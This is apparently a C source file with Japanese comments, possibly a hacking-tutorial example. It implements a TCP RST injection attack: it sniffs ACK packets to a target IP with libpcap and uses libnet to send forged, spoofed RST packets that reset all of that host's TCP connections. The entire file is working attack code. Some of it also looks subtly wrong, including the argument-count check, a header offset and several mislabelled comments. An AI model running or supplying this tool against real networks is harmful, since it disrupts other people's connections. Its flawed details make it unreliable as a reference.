#include <libnet.h>
#include <pcap.h>
#include "hacking.h"

void caught_packet(u_char *, const struct pcap_pkthdr *, const u_char *);
int set_packet_filter(pcap_t *, struct in_addr *);

struct data_pass {
   int libnet_handle;
   u_char *packet;
}; 
   
int main(int argc, char *argv[]) {
   struct pcap_pkthdr cap_header;
   const u_char *packet, *pkt_data;
   pcap_t *pcap_handle;
   char errbuf[PCAP_ERRBUF_SIZE]; // LIBNET_ERRBUF_SIZEと同じサイズ
   char *device;
   u_long target_ip;
   int network;
   struct data_pass critical_libnet_data;
   
   if(argc < 1) {
      printf("使用方法： %s ＜対象IPアドレス＞\n", argv[0]);
      exit(0);
   }
   target_ip = libnet_name_resolve(argv[1], LIBNET_RESOLVE);

   if (target_ip == -1)
      fatal("対象アドレスが不正です。");

   device = pcap_lookupdev(errbuf);
   if(device == NULL)
      fatal(errbuf);

   pcap_handle = pcap_open_live(device, 128, 1, 0, errbuf);
   if(pcap_handle == NULL)
      fatal(errbuf);

   critical_libnet_data.libnet_handle = libnet_open_raw_sock(IPPROTO_RAW);
   if(critical_libnet_data.libnet_handle == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't open network interface.  -- this program must run as root.\n");

   libnet_init_packet(LIBNET_IP_H + LIBNET_TCP_H, &(critical_libnet_data.packet));
   if (critical_libnet_data.packet == NULL)
      libnet_error(LIBNET_ERR_FATAL, "can't initialize packet memory.\n");

   libnet_seed_prand();

   set_packet_filter(pcap_handle, (struct in_addr *)&target_ip);

   printf("Resetting all TCP connections to %s on %s\n", argv[1], device);
   pcap_loop(pcap_handle, -1, caught_packet, (u_char *)&critical_libnet_data);

   pcap_close(pcap_handle);
}


/* target_ipに対する確立済みのTCPコネクションを検索するためのパケットフィルタを設定する。 */
int set_packet_filter(pcap_t *pcap_hdl, struct in_addr *target_ip) {
   struct bpf_program filter;
   char filter_string[100];

   sprintf(filter_string, "tcp[tcpflags] & tcp-ack != 0 and dst host %s", inet_ntoa(*target_ip));

   printf("DEBUG: filter string is \'%s\'\n", filter_string);
   if(pcap_compile(pcap_hdl, &filter, filter_string, 0, 0) == -1)
      fatal("pcap_compile failed");

   if(pcap_setfilter(pcap_hdl, &filter) == -1)
      fatal("pcap_setfilter failed");
}

void caught_packet(u_char *user_args, const struct pcap_pkthdr *cap_header, const u_char *packet) {
   u_char *pkt_data;
   struct libnet_ip_hdr *IPhdr;
   struct libnet_tcp_hdr *TCPhdr;
   struct data_pass *passed;
   int bcount;

   passed = (struct data_pass *) user_args; // 構造体へのポインタを用いてデータを引き渡す

   IPhdr = (struct libnet_ip_hdr *) (packet + LIBNET_ETH_H);
   TCPhdr = (struct libnet_tcp_hdr *) (packet + LIBNET_ETH_H + LIBNET_TCP_H);

   printf("resetting TCP connection from %s:%d ",
         inet_ntoa(IPhdr->ip_src), htons(TCPhdr->th_sport));
   printf("<---> %s:%d\n",
         inet_ntoa(IPhdr->ip_dst), htons(TCPhdr->th_dport));
   libnet_build_ip(LIBNET_TCP_H,      // IPヘッダを除いたパケットのサイズ
      IPTOS_LOWDELAY,                 // IP tos 
      libnet_get_prand(LIBNET_PRu16), // IP ID（乱数化）
      0,                              // 断片化
      libnet_get_prand(LIBNET_PR8),   // TTL （乱数化）
      IPPROTO_TCP,                    // トランスポートプロトコル
      *((u_long *)&(IPhdr->ip_dst)),  // 送信元IP （宛先であることを詐称する） 
      *((u_long *)&(IPhdr->ip_src)),  // 送信元IP （送信元に送り返す）
      NULL,                           // ペイロード（なし）
      0,                              // ペイロード長
      passed->packet);                // パケットヘッダメモリ

   libnet_build_tcp(htons(TCPhdr->th_dport), // 送信元TCPポート （乱数化）
      htons(TCPhdr->th_sport),        // 宛先TCPポート（送信元に送り返す）
      htonl(TCPhdr->th_ack),          // シーケンス番号 （以前のACKを使用）
      libnet_get_prand(LIBNET_PRu32), // 確認応答（ACK）番号 （乱数化）
      TH_RST,                         // コントロールフラグ （RSTフラグのみ設定）
      libnet_get_prand(LIBNET_PRu16), // ウィンドウサイズ （乱数化）
      0,                              // 至急ポインタ
      NULL,                           // ペイロード （なし）
      0,                              // ペイロード長
      (passed->packet) + LIBNET_IP_H);// パケットヘッダメモリ

   if (libnet_do_checksum(passed->packet, IPPROTO_TCP, LIBNET_TCP_H) == -1)
      libnet_error(LIBNET_ERR_FATAL, "can't compute checksum\n");

   bcount = libnet_write_ip(passed->libnet_handle, passed->packet, LIBNET_IP_H+LIBNET_TCP_H);
   if (bcount < LIBNET_IP_H + LIBNET_TCP_H)
      libnet_error(LIBNET_ERR_WARNING, "Warning: Incomplete packet written.");

   usleep(5000); // しばらく休止する
}
